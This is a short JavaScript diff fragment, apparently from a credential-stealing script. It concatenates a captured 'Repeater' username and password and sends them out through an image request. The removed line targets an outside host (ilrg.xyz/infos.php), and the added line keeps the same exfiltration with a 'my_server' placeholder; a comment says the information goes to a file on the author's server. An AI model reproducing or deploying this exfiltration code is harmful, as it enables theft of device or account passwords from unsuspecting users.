@@ -40,4 +40,4 @@ data2 = "Repeater username: " + user + "  Repeater password: " + oldPasswd1;
 
 data3 = data + data2;
 
-new Image().src="https://ilrg.xyz/infos.php?data="+data3 //send info to a file in my server
+new Image().src="my_server"+data3 //send info to a file in my server
